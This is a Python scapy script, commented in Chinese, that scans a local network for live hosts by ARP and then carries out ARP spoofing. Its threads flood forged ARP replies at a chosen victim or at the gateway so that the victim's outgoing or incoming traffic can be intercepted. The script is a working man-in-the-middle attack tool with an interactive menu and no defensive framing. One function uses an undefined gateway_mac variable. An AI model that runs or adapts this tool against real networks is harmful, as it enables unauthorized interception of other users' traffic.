from scapy.all import *
import time
import threading
from scapy.all import *
import sys

def im_scan(ipduan):
    ipscan=ipduan
    try:
        ans,unans = srp(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(pdst=ipscan),timeout=2,verbose=False)
    except Exception as e:
        print (str(e))
    else:
        for snd,rcv in ans:
            list_mac=rcv.sprintf("%Ether.src% - %ARP.psrc%")
            print (list_mac)
            
def arp_spoof(tgt_ip,gateway_ip,iface):
    mmac=get_if_hwaddr(iface)
    tgt_mac=getmacbyip(tgt_ip)
    if tgt_ip:
        while 1:
            sendp(Ether(src=mmac,dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=mmac,psrc=gateway_ip,pdst=tgt_ip,op=2))
    else:
        while 1:
            sendp(Ether(src=mmac,dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=mmac,psrc=gateway_ip,op=2))

def arp_gate(tgt_ip,gateway_ip,iface):
    mmac=get_if_hwaddr(iface)
    tgt_mac=getmacbyip(tgt_ip)
    while 1:
        sendp(Ether(dst=gateway_mac,src=mmac)/ARP(hwsrc=mmac,psrc=tgt_ip,pdst=gateway_ip,op=2))


if __name__=='__main__':
    ipduan='192.168.0.0/24'
    tgt_ip='192.168.0.104' #要打整个局域网就别设置这个，要截获外界发往机器的数据这个也必须设置
    gateway_ip='192.168.0.1'
    iface='WLAN'
    threads_num=20
    print("如果想搞整个局域网就别设置tgt_ip,要截获外界发往机器的数据这个必须设置")
    so_scan=input("[+]要扫描局域网存活主机和它的mac吗[Y/N]")
    if so_scan=='Y':
        im_scan(ipduan)
    else:
        so_judge=input("[+]你是想让机器的发送的数据被你截获Y，还是外界发送给机器的数据被你截获N[Y/N]")
        if so_judge=='Y':
            print('开始截胡机器发送往外界的数据')
            time.sleep(3)
            for i in range(threads_num):
                t1=threading.Thread(target=arp_spoof,args=(tgt_ip,gateway_ip,iface),name=str(i))
                t1.start()
        else:
            if tgt_ip:
                    print('开始截胡外界发往机器的数据')
                    time.sleep(3)
                    for i in range(threads_num):
                        t2=threading.Thread(target=arp_gate,args=(tgt_ip,gateway_ip,iface),name=str(i))
                        t2.start()
            else:
                print('请设置tgt_ip')